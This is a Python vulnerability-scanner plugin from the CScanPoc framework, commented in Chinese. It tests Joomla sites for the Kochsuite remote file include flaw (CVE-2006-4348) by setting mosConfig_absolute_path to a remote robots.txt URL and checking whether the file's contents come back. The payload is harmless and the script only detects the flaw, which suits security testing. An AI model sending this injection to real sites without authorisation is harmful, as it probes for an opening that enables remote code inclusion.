# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0058'  # 平台漏洞编号
    name = 'Joomla Kochsuite Component <= 0.9.4 - Remote File Include Vulnerability'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RFI  # 漏洞类型
    disclosure_date = '2006-10-17'  # 漏洞公布时间
    desc = '''
        Joomla Kochsuite Component <= 0.9.4版本存在远程文件包含漏洞。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2006-6478'
    cnvd_id = 'CNVD-2006-6478'  # cnvd漏洞编号
    cve_id = 'CVE-2006-4348'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Joomla Kochsuite Component <= 0.9.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '73c5ff4e-17ed-4aae-896a-c59ff6ba2e2c'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = arg + '/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=http://baidu.com/robots.txt'
            response = requests.get(vul_url).content
            if 'Baiduspider' in response or 'Googlebot' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
